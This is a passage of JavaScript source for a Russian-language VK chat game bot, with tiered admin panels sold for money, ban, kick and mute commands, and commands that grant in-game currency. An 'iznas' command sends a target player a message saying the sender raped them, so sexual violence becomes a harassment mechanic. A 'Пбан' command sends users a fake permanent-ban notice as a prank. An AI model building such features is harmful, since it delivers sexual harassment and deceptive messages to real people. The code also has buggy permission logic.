		💴 ➾ Лимит на передачу: 20.000.000$
		⛔ ➾ Нет лимита на ставки в играх!

		⛔⛔ Цена: 500 рублей ⛔⛔

		- - - - - - - - - - - -
		👑 ➾ Главный ADMIN-Команды « 👑
		✅ ➾ Все команды ADMIN'a

		✅ ➾ setmoney [COUNT] - выдать себе валюту.
		⚠ ➾ [COUNT] - от 1 до 80000000.
		💴 ➾ Лимит на передачу: 20.000.000.
		⛔ ➾ Нет лимита на ставки в играх!

		⛔⛔ Цена: 1500 рублей ⛔⛔
		`);
		if(user.ap == 1){
			return message.send(`
				☑ ➾ VIP-Панель « ☑
				✅ ➾ аправила - важно знать!   
				✅ ➾ kiss [ID] - поцеловать игрока  
				✅ ➾ стата - Ваша статистика.
				✅ ➾ get [ID] - проверить игрока.
				✅ ➾ sms [ID] [текст] - отправить личное сообщение
				✅ ➾ iznas [ID] причина - изнасиловать игрока
				✅ ➾ лс текст - отправить VIP сообщение 

				✅ ➾ mute [ID] [TIME] - Выдать 'молчанку' игроку.
				✅ ➾ unmute [ID] - Снять 'Молчанку'.  

				✅ ➾ setmoney [COUNT] - выдать себе валюту.
				⚠ ➾ [COUNT] - от 1 до 500000.

				☑ ➾ - - Бонусы - - « ☑
				💴 ➾ Лимит на передачу: 7.000.000$
				🌚 ➾ админкейс - бонусный кейс [раз в 10мин]

				`);
		} 
		if(user.ap == 2){

			return message.send(`
				☑ ➾ MODER-Панель « ☑
				✅ ➾ аправила - важно знать!   
				✅ ➾ warn [ID] - выдать предупреждение. 
				✅ ➾ mute [ID] [TIME] - Выдать 'молчанку' игроку.
				✅ ➾ unmute [ID] - Снять 'Молчанку'. 
				💴 ➾ тырнуть [ID] - стырить у игрока 50.000 $ ( Раз в 30 минут )				

				✅ ➾ ответ [ID] [TEXT] - ответить на репорт.
				✅ ➾ стата - Ваша статистика.  
				✅ ➾ get [ID] - проверить игрока.

				✅ ➾ setmoney [COUNT] - выдать себе валюту.
				⚠ ➾ [COUNT] - от 1 до 3000000.

				☑ ➾ - - Бонусы - - « ☑
				💴 ➾ Лимит на передачу: 10.000.000$
				🌚 ➾ админкейс - бонусный кейс [раз в 10мин]
				`);
		}
		if(user.ap == 3){

			return message.send(`
				☑ ➾ ADMIN-Панель « ☑
				✅ ➾ аправила - важно знать! 
				✅ ➾ ban [ID] - заблокировать навсегда.
				✅ ➾ unban [ID] - разблокировать игрока.
				✅ ➾ warn [ID] - выдать предупреждение. 
				✅ ➾ mute [ID] [TIME] - Выдать 'молчанку' игроку.
				✅ ➾ unmute [ID] - Снять 'Молчанку'.  
				✅ ➾ setnick [ID] [NAME] - изменить ник.

				✅ ➾ ответ [ID] [TEXT] - ответить на репорт.
				✅ ➾ стата - Ваша статистика.  
				✅ ➾ get [ID] - проверить игрока.

				✅ ➾ setmoney [COUNT] - выдать себе валюту.
				⚠ ➾ [COUNT] - от 1 до 20000000.

				✅ ➾ Кикнуть [ССЫЛКА_ВК] - кикнуть из беседы.
				⚠ ➾ В не офф.беседах кикает, если статус группы: 'Администратор'

				☑ ➾ - - Бонусы - - « ☑
				⛔ ➾ Нет лимита на ставки в играх!
				💴 ➾ Лимит на передачу: 10.000.000$
				🌚 ➾ админкейс - бонусный кейс [раз в 10мин]
				`);
		}
		if(user.ap > 3){

			return message.send(`
				☑ ➾ Админ-Панель « ☑
				✅ ➾ аправила - важно знать! 
				✅ ➾ ban [ID] - заблокировать навсегда.
				✅ ➾ unban [ID] - разблокировать игрока. 
				✅ ➾ warn [ID] - выдать предупреждение.
				✅ ➾ unwarn [ID] - снять все предупреждения.
				✅ ➾ mute [ID] [TIME] - Выдать 'молчанку' игроку.
				✅ ➾ unmute [ID] - Снять 'Молчанку'.  

				✅ ➾ setnick [ID] [NAME] - изменить ник.
				✅ ➾ ответ [ID] [TEXT] - ответить на репорт.
				✅ ➾ стата - Ваша статистика.

				✅ ➾ get [ID] - проверить игрока. 

				✅ ➾ setmoney [COUNT] - выдать себе валюту.
				⚠ ➾ [COUNT] - от 1 до 80000000.
				- - - - - - - - - - - 

				✅ ➾ Кикнуть [ССЫЛКА_ВК] - кикнуть из беседы.
				⚠ ➾ В не офф.беседах кикает, если статус группы: 'Администратор'

				☑ ➾ - - Бонусы - - « ☑
				⛔ ➾ Нет лимита на ставки в играх!
				💴 ➾ Лимит на передачу: 20000000.
				🌚 ➾ админкейс - бонусный кейс [раз в 10мин]
				`);
		}
	});

	vk.updates.hear(/^(?:кикнуть)(\s?https\:\/\/vk\.com\/)?(id)?([0-9]+)?([^]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(!message.isChat) return message.send(`Данная команда доступна в беседе.`) 
			if(user.ap < 3) return message.send(`⚠ ➾ Вы не Администратор`);
		if(user.bloks.rukus == true) return message.send(`⚠ Не флудите !`);
		user.bloks.rukus = true
		setTimeout(() => {
			user.bloks.rukus = false
		}, 55000);

		if(message.$match[4]) { 
			var domain = message.$match[4].split(" "); 
			vk.api.call("utils.resolveScreenName", { 
				screen_name: message.$match[4] 
			}).then((res) => { 
				if(res.object_id == 530903911) {
					message.send(`⛔ Ошибка. Это @vkbotevolk(разработчик) @mskbt(проекта).\n -- Вы никак не можете воздействовать на данный профиль.`);
					return message.sendSticker(13475);
				} 

				if(acc.users[user_id(res.object_id)]){
					if(acc.users[user_id(res.object_id)].ap > 3) return message.send(`⚠ ➾ Нельзя кикнуть этого игрока!`);
				} 

				vk.api.call("messages.removeChatUser", {chat_id: message.chatId, user_id: res.object_id })
				.catch((error) => {return message.send(`⚠ ➾ Ошибка. Возможные причины:\n⚠ ➾ В данной беседе группа не Администратор\n⚠ ➾ Такого игрока нет в беседе.`);
				});  
				return  
			})  
		}else{
			if(!message.$match[3]) return message.reply("⚠ ➾ ID не указан, либо указан неверно."); 
			if(message.$match[3] == 530903911) {
				message.send(`⛔ Ошибка. Это @vkbotevolk(разработчик) @mskbt(проекта).\n -- Вы никак не можете воздействовать на данный профиль.`);
				return message.sendSticker(13475);
			}

			if(acc.users[user_id(message.$match[3])]){
				if(acc.users[user_id(message.$match[3])].ap > 3) return message.send(`⚠ ➾Нельзя кикнуть этого игрока!`);
			}

			vk.api.call("messages.removeChatUser", { chat_id: message.chatId, user_id: message.$match[3] }).
			catch((error) => {return message.send(`⚠ ➾ Ошибка. Возможные причины:\n⚠ ➾ В данной беседе группа не Администратор\n⚠ ➾ Такого игрока нет в беседе.`);}); 

			return  				
		} 
	});


	vk.updates.hear(/^(?:поиск)(\shttps\:\/\/vk\.com\/)?(id)?([0-9]+)?([^]+)?/i, message => { 
		if(message.$match[3]){
			var id = user_id(message.$match[3]);
			if (!acc.users[id]) return message.send(`Не верно указаны данные | Игрока нет`); 
			if(message.$match[3] == 530903911) {
				message.send(`⛔ Ошибка. Это @vkbotevolk(разработчик) @mskbt(проекта).\n -- Вы никак не можете воздействовать на данный профиль.`);
				return message.sendSticker(13475);
			}
			return message.send(`
				Игрок: ${acc.users[id].prefix}
				ID: ${id}
				Статус: ${acc.users[id].ap.toString().replace(/0/gi, "Игрок").replace(/1/gi, "Стажёр").replace(/2/gi, "Администратор").replace(/3/gi, "Главный Администратор")}
				`);
		}else{ 
			if(!message.$match[4]) return message.send(`Укажите данные`);
			var domain = message.$match[4].split(" ");
			vk.api.call("utils.resolveScreenName", {
				screen_name: message.$match[4]
			}).then((res) => { 
				if(res.object_id == 530903911) {
					message.send(`⛔ Ошибка. Это @vkbotevolk(разработчик) @mskbt(проекта).\n -- Вы никак не можете воздействовать на данный профиль.`);
					return message.sendSticker(13475);
				} 
				var id = user_id(res.object_id);
				if (!acc.users[id]) return message.send(`Не верно указаны данные | Игрока нет`);  
				return message.send(`
					Игрок: ${acc.users[id].prefix}
					ID: ${id}
					Статус: ${acc.users[id].ap.toString().replace(/0/gi, "Игрок").replace(/1/gi, "Стажёр").replace(/2/gi, "Администратор").replace(/3/gi, "Главный Администратор")}
					`);
			})
			return;
		}

	});


	vk.updates.hear(/^(?:sms)\s?([0-9]+)?\s([^]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.admin.block_rep == true) return message.send(`🔸 ➾ У вас заблокированы ответы на репорт.`)
			if(user.ap < 3) return
				if(!Number(message.$match[1]) || !message.$match[1] || !message.$match[2] || !acc.users[message.$match[1]]) return message.send(`🔸 ➾ Проверьте вводимые данные.`);
			let a = zapret(message.$match[2]);
			if(a != 0) return message.send(a); 
			vk.api.call("messages.send", {
				peer_id: acc.users[message.$match[1]].id,
				message: `👑 VIP 👑: ${user.prefix} прислал вам сообщение :\n👉 ${message.$match[2]}\n\n`,random_id: 0
			}).then((res) => {}).catch((error) => {console.log('ans error'); });	
			var is = [user_id(message.user), message.text] 
			adm_log(is)
			user.ainfo.all_ans += 0;
			user.ainfo.ans += 0;
			acc.users[message.$match[1]].rep.status = true;
			acc.users[message.$match[1]].rep.id = Number(user_id(message.user));
			return message.send(`👉 ➾sms отправлено`)
		});

	vk.updates.hear(/^(?:setnick)\s?([0-9]+)?\s([^]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`); 
		if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: setnick [ID] [ИМЯ]`);
		let zaprets1 = message.$match[2].toLowerCase();
		var zapret = /(вк бо т |сова не спит|сова никогда не спит|с о в а н е с п и т|сованикогданеспит|сова не спит никогда|вкботру|vkvot ru|vkbotru|vkbot|v k b o t . r u|в к бот|порно|botvk|ботвк|vkbot|кбот|bot vk|хентай|секс|пидр|трах|насилие|зоофил|бдсм|сирия|hentai|hentay|синий кит|самоубийство|террористы|слив|цп|cp|маленькие|малолетки|сучки|трах|ебля|изнасилование|блять|хуй|пошел нах|тварь|мразь|сучка|гандон|уебок|шлюх|паскуда|оргазм|девственницы|целки|рассовое|мелкие|малолетки|несовершеннолетние|ебля|хентай|sex|bdsm|ebl|trax|syka|shlux|инцест|iznas|мать|долбаеб|долбаёб|хуесос|сучка|сука|тварь|пездюк|хуй|шлюх|бог|сатана|мразь)/
		if (zapret.test(zaprets1) == true) { 
			return message.send(`📗 ➾ Придумайте адекватный ник`);
		}
		var filter0 = /(http(s)?:\/\/.)?(www\.)?[-a-z0-9@:%._\+~#=]{1,256}\.[a-z]{2,6}/
		var filter1 = /(?!http(s)?:\/\/)?(www\.)?[а-я0-9-_.]{1,256}\.(рф|срб|блог|бг|укр|рус|қаз|امارات.|مصر.|السعودية.)/
		var lol = filter0.test(zaprets1)
		var lol1 = filter1.test(zaprets1)	
		if (filter0.test(zaprets1) == true || filter1.test(zaprets1) == true) { 
			return message.send(`📗 ➾ Придумайте адекватный ник`);
		}
		var is = [user_id(message.user), message.text] 
		adm_log(is)
		acc.users[message.$match[1]].prefix = message.$match[2];
		user.ainfo.nicks += 1;
		return message.send(`📗 ➾ Вы сменили ник игрока на: ${message.$match[2]}`);
	});


	vk.updates.hear(/^(?:ответ)\s?([0-9]+)?\s([^]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.admin.block_rep == true) return message.send(`🔸 ➾ У вас заблокированы ответы на репорт.`)
			if(user.ap < 3) return
				if(!Number(message.$match[1]) || !message.$match[1] || !message.$match[2] || !acc.users[message.$match[1]]) return message.send(`🔸 ➾ Проверьте вводимые данные.`);
			let a = zapret(message.$match[2]);
			if(a != 0) return message.send(a); 
			vk.api.call("messages.send", {
				peer_id: acc.users[message.$match[1]].id,
				message: `👤 Администратор: ${user.prefix} ответил Вам:\n${message.$match[2]}\n\n◯ Оцените ответ: респект +/- [хорошо/плохо]`,random_id: 0
			}).then((res) => {}).catch((error) => {console.log('ans error'); });	
			var is = [user_id(message.user), message.text] 
			adm_log(is)
			user.ainfo.all_ans += 1;
			user.ainfo.ans += 1;
			acc.users[message.$match[1]].rep.status = true;
			acc.users[message.$match[1]].rep.id = Number(user_id(message.user));
			return message.send(`👉 ➾ Ответ отправлен.`)
		});

//////////////////////////////////
vk.updates.hear(/^(?:giveceys)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].ap < 3) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'giveceys [ID] [COUNT]'`); 
	acc.users[message.$match[1]].his += Number(message.$match[2]);

	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💰 ➾ Вы выдали [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])} успешно !`);


});
vk.updates.hear(/^(?:givesuk)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].ap < 3) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'giveceys1 [ID] [COUNT]'`); 
	acc.users[message.$match[1]].volff6 += Number(message.$match[2]);

	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💰 ➾ Вы выдали [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])} успешно !`);


});


vk.updates.hear(/^(?:азаявка)\s?([^]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 5) return message.send(`Ваш уровень мал ! Требование: от 5 уровня.`);		
	for(i=0;i<200000;i++){
		if(acc.users[i]){
			if(acc.users[i].ap >= 3){ 
				vk.api.call("messages.send", {
					peer_id: acc.users[i].id,
					message: ` [⚠🛑⚠]: Уважаемая администрация ! Игрок под ID ${user_id(message.user)} просит чтобы Вы подтвердили его аккаунт !\n⚠Вы должны чотка знать, что его уровень больше 5! Проверить это легко ! Напишите " get ${user_id(message.user)} "\nЧтобы подтвердить его аккаунт, напишите " pyes ${user_id(message.user)} "\nЧтобы отказать/снять напишите " pno ${user_id(message.user)} "`, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('report error'); });	
			}
		}
	}
	return message.send(`Заявка подана. Ожидайте !`);
});





vk.updates.hear(/^(?:ban)\s?([0-9]+)?\s([^]+)?/i, (message) => {		
	let user = acc.users[user_id(message.user)];
	if (message.$match[1] == 1) {
		message.send(`⛔ Ошибка. Это @vkbotevolk(разработчик) @mskbt(проекта).\n -- Вы никак не можете воздействовать на данный профиль.`);
		return message.sendSticker(13475);
	} 
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: ban [ID] [ПРИЧИНА]`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не спец администратор.`);
	if(user.bloks.rukus == true) return message.send(`⚠ Не флудите !`);
	user.bloks.rukus = true
	setTimeout(() => {
		user.bloks.rukus = false
	}, 55000);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a)
		if(acc.users[message.$match[1]].ap > 3) return message.send(`Ошибка !`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].ban = message.$match[2]; 
	user.ainfo.bans += 1;
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `✅ ➾ ${user.prefix} заблокировал Вас навсегда.\n✅ ➾ Причина: ${message.$match[2]}\nВас заблокировал спец администратор и аккаунт разблокировать не получится. Разбаны не продаются. Всего доброго.`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`✅ ➾ Вы заблокировали игрока [${acc.users[message.$match[1]].prefix}] навсегда.\n✅ ➾ Причина: ${message.$match[2]}`);
}); 
vk.updates.hear(/^(?:Пбан)\s?([0-9]+)?\s([^]+)?/i, (message) => {		
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: пбан [ID] [ПРИЧИНА]`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.balance < 45000) return message.send(`🔸 ➾ У вас нет 45.000 $ !`);
	user.balance -= 45000;
	user.upis56456456 += 1;
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a)
		if(acc.users[message.$match[1]].ap > 3) return message.send(`Ошибка !`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `✅ ➾ ${user.prefix} заблокировал Вас навсегда.\n✅ ➾ Причина: ${message.$match[2]}\nЕсли Вы не согласны с блокировкой, можете подать жалобу со скринами тут https://vk.com/topic-181438458_39576334`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`✅ ➾ Вы заблокировали игрока [${acc.users[message.$match[1]].prefix}] навсегда.\n✅ ➾ Причина: ${message.$match[2]}\n-45.000 $ за пранк !`);
}); 
vk.updates.hear(/^(?:setpit)\s?([0-9]+)?\s([^]+)?/i, (message) => {		
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: setpit [ID] [название]`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не спец администратор`);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a)
		if(acc.users[message.$match[1]].ap > 3) return message.send(`Ошибка !`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].pit = message.$match[2]; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ``,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Успешно !`);
}); 
vk.updates.hear(/^(?:can)\s?([0-9]+)?\s([^]+)?/i, (message) => {		
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: ban [ID] [ПРИЧИНА]`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a)
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].ban = message.$match[2]; 
	user.ainfo.bans += 1;
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `✅ ➾ ${user.prefix} заблокировал Вас навсегда.\n✅ ➾ Причина: ${message.$match[2]}\nЕсли Вы не согласны с блокировкой, можете подать жалобу со скринами тут https://vk.cc/96c7rS`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`✅ ➾ Вы заблокировали игрока [${acc.users[message.$match[1]].prefix}] навсегда.\n✅ ➾ Причина: ${message.$match[2]}`);
}); 
vk.updates.hear(/^(?:бан)\s?([0-9]+)?\s([^]+)?/i, (message) => {		
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: ban [ID] [ПРИЧИНА]`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`);
	if(user.bloks.rukus == true) return message.send(`⚠ Не флудите !`);
	user.bloks.rukus = true
	setTimeout(() => {
		user.bloks.rukus = false
	}, 55000);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a)
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].ban = message.$match[2]; 
	user.ainfo.bans += 1;
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `✅ ➾ ${user.prefix} заблокировал Вас навсегда.\n✅ ➾ Причина: ${message.$match[2]}\nЕсли Вы не согласны с блокировкой, можете подать жалобу со скринами тут https://vk.cc/96c7rS`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`✅ ➾ Вы заблокировали игрока [${acc.users[message.$match[1]].prefix}] навсегда.\n✅ ➾ Причина: ${message.$match[2]}`);
}); 

vk.updates.hear(/^(?:iznas)\s?([0-9]+)?\s([^]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.bloks.cases == true) return message.send(`<<< 😪🤞🏻 >>>: НАСИЛОВАТЬ ИГРОКА МОЖНО РАЗ в 24 часа`);
	if(user.bloks.rukus == true) return message.send(`⚠ Не флудите !`);
	user.bloks.rukus = true
	setTimeout(() => {
		user.bloks.rukus = false
	}, 55000);
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: iznas [ID] [ПРИЧИНА]`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не VIP`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `😻😻😻😻 О ЕЕЕЕЕЕ ${user.prefix} ИЗНАСИЛОВАЛ ТЕБЯ.\n✅ ➾ Причина: ${message.$match[2]}\n`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`😻😻😻😻 .!. ВЫ ИЗНАСИЛОВАЛИ [${acc.users[message.$match[1]].prefix}] :))))\n✅ ➾ Причина: ${message.$match[2]}`);
}); 









vk.updates.hear(/^(?:setmoney)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.admin.block_give == true) return message.send(`🔸 ➾ У вас заблокирована выдача валюты.`)
		if(user.ap < 3) return message.send(`⚠ Доступ временно закрыт.`);
	if(user.bloks.giverub == true) return message.send(`💰 ➾ Выдавать валюту можно раз в час`);
	if(user.ap == 1){
		if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 50000) return message.send(`💰 ➾ Пример: 'setmoney [1-50000]'`);
		user.balance += Number(message.$match[1]);
	}
	if(user.ap == 3){
		if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 3000000) return message.send(`💰 ➾ Пример: 'setmoney [1-3000000]'`);
		user.balance += Number(message.$match[1]);
	}
	if(user.ap == 3){
		if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 10000000) return message.send(`💰 ➾ Пример: 'setmoney [1-10000000]'`);
		user.balance += Number(message.$match[1]);
	}
	if(user.ap > 3){
		if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 80000000) return message.send(`💰 ➾ Пример: 'setmoney [1-80000000]'`);
		user.balance += Number(message.$match[1]);
	}
	user.bloks.giverub = true;
	setTimeout(() => {
		user.bloks.giverub = false;
	}, 3600000);

	return message.send(`💰 ➾ Вы выдали себе ${spaces(message.$match[1])}$`);
});








vk.updates.hear(/^(?:lvldell)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].ap < 3) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'lvldell [ID] [lvl]'`); 
	acc.users[message.$match[1]].upis65465465 -= Number(message.$match[2]);

	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💰 ➾ Вы ЗАБРАЛИ [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])} LVL`);


});
vk.updates.hear(/^(?:lvlapp)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].ap < 3) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'lvlapp [ID] [lvl]'`); 
	acc.users[message.$match[1]].upis65465465 += Number(message.$match[2]);

	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💰 ➾ Вы выдали [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])} LVL`);


});
vk.updates.hear(/^(?:donaterub)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].ap < 3) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'donaterub [ID] [COUNT]'`); 
	acc.users[message.$match[1]].opea += Number(message.$match[2]);

	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💰 ➾ Вы выдали [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])}`);


});
vk.updates.hear(/^(?:givedollar)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].ap < 3) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'givedollar [ID] [COUNT]'`); 
	acc.users[message.$match[1]].ivan2256768ivan2256768 += Number(message.$match[2]);

	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💰 ➾ Вы выдали [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])} доната`);


});
///////////////////////

////////////////////
vk.updates.hear(/^(?:givedam)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].ap < 3) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'givedam [ID] [COUNT]'`); 
	acc.users[message.$match[1]].volftube7 += Number(message.$match[2]);

	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💰 ➾ Вы выдали [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])} чемодан !`);


});



vk.updates.hear(/^(?:givebit)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].ap < 3) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'giverub [ID] [COUNT]'`); 
	acc.users[message.$match[1]].bitcoin += Number(message.$match[2]);

	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💰 ➾ Вы выдали [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])} биткоинов`);


});
vk.updates.hear(/^(?:givepolice)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].ap < 3) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'givepolice [ID] [lvl]'`); 
	acc.users[message.$match[1]].mysor = Number(message.$match[2]);

	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`SER Вы выдали [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])}$`);


});

vk.updates.hear(/^(?:ungiverub)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].ap < 3) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'ungiverub [ID] [COUNT]'`); 
	acc.users[message.$match[1]].balance -= Number(message.$match[2]);

	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💰 ➾ Вы отняли у [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])}$`);


});

vk.updates.hear(/^(?:removerub)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].ap < 3) return; 
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'removerub [ID]'`); 
	acc.users[message.$match[1]].balance = 0;
	logs(user_id(message.user), message.$match[1], message.$match[2], type = 3)
	return message.send(`💰 ➾ Вы забрали все $ у [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})]`);

});


